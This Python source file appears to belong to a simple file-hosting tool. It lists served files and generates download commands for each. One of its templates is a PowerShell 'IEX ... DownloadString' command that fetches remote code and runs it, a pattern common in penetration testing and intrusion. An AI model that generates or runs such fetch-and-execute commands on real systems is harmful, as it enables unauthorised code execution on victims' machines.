from lib import logger, arguments
import os

args = arguments.get_args()

def do(cmd):
	if 'list' in cmd:
		get_hosted_files()

	if 'exit' in cmd:
		logger.msg('CTRL+C to kill the server!',None,'red')
		quit()

	if 'generate' in cmd:
		if cmd.startswith('generate '):
			cmd = cmd.split(' ')[1]
			generate_command(cmd)

def get_hosted_files():
	hosted_path = args.directory
	url = f'http://{args.server_address}:{args.server_port}/'
	if not os.path.exists(hosted_path):
		logger.msg('Creating directory: ',hosted_path,'blue')
		os.mkdir(hosted_path)
	else:
		files = os.listdir(hosted_path)
		logger.list_dir(url,files)
		print()

def generate_command(cmd):
	files = os.listdir(args.directory)
	url = f'http://{args.server_address}:{args.server_port}/'
	commands = []
	for f in files:
		if cmd == 'curl':
			commands.append(f'curl {url}{f} --output {f}')
		if cmd == 'wget':
			commands.append(f'wget {url}{f}')
		if cmd == 'Invoke-WebRequest':
			commands.append(f'Invoke-WebRequest -Uri {url}{f} -OutFile {f}')
		if cmd == 'DownloadString':
			commands.append(f'powershell.exe -c IEX (New-Object Net.WebClient).DownloadString({url}{f})')

	logger.list_commands(commands)


